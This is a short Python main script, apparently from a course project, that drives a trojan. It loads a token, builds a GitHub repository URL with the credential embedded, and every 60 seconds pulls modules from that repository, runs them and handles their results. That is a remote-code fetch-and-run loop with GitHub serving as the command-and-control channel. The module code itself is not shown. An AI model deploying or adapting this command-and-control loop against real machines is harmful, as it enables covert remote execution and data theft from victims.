import os
import time

from dotenv import load_dotenv

from trojan import Trojan

load_dotenv()

TOKEN = os.getenv("TOKEN")
GITHUB_REP: str = f"https://flufsor:{TOKEN}@github.com/flufsor/Python_2223_trojan_modules"
WAIT_TIME: int = 60


if __name__ == '__main__':
    trojan = Trojan(GITHUB_REP)

    while True:
        trojan.update_repo()

        trojan.run_modules()

        trojan.handle_results()

        time.sleep(WAIT_TIME)
